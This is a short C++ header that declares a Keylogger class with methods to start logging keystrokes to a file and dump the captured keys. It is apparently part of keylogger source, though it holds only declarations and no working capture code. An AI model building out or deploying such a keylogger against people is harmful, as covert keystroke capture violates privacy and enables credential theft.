#pragma once

#ifndef KEYLOGGER_H
#define KEYLOGGER_H



#include <fstream>

class Keylogger
{
public:
	static void startLogger(char* filePath);
	static std::string dumpKeys(char* filePath);
private:
	static void logger(char* filePath);
};

#endif // !KEYLOGGER_H